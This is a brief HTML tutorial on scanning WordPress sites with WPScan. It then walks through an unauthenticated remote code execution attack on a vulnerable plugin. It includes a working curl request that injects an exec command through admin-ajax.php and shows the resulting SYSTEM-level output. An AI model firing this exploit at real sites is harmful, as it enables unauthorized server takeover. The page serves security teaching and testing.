<h1>Using WPScan to find vulnerabilities</h1>

<p></p>

<h2>Start WPScan</h2>
<p><ol>
<ul>sudo wpscan --url http://[website] --api-token [API token]</ul>
</ol></p>
<p>After analysis, wpscan will show the vulnerabilities found</p>
<h2>Remote Code Execution (RCE) Attack</h2>
<p>Remote Code Execution vulnerability is a critical security flaw that allows an attacker to execute arbitrary code on a target system remotely, without needing physical access to the system. 
  This type of vulnerability is particularly dangerous because it enables attackers to take control of the target system, potentially gaining unauthorized access, stealing data, or causing damage to the 
  system or network. Attackers exploit these vulnerabilities by injecting malicious code into the target system through various means such as input fields, file uploads, or network protocols. Once the 
  malicious code is executed, the attacker can gain control over the system and perform actions as if they were an authenticated user or system administrator.</p>
<p><ol>
  <ul>after analysis with wpscan, browse to the <b>Plugin(s) Identified</b> section, and observe the installed vulnerable plugins</ul>
  <ul>one of the plugins may have an <b>Unauthenticated Remote Code Execution (RCE)</b> vulnerability</ul>
  <ul>To perform RCE attack, run <i>curl -i 'http://[website]/wp-admin/admin-ajax.php?action=upg_datatable&field:exec:whoami:NULL:NULL'</i></ul>
  <ul>This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the <b>admin-ajax.php</b> file, 
  allowing an attacker to execute arbitrary system commands via the <b>exec</b> function, potentially leading to <b>remote code execution</b></ul>
  <ul>In this case, <b>whoami</b> was executed, yielding the outcome <b>nt authority\\system</b></ul>
</ol></p>
